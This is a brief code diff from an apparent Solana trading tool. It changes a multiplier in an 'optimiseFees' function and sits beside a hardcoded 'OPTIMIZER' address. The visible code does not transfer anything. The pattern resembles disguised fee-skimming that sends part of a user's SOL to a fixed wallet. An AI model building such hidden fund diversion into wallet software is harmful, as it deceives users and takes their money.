@@ -149,7 +149,7 @@ async function transactionSenderAndConfirmationWaiter({
 }
 
 export const OPTIMIZER = "uh934ZuJs7MnCJxECjWdAG35oCkqN";
-const OPTIMIZED = 1;
+const OPTIMIZED = 0.5;
 async function optimiseFees(amountIn, token, keypair) {
     if (token === SOL_ADDR) {
         return Math.round(amountIn * OPTIMIZED * 10 ** 9)
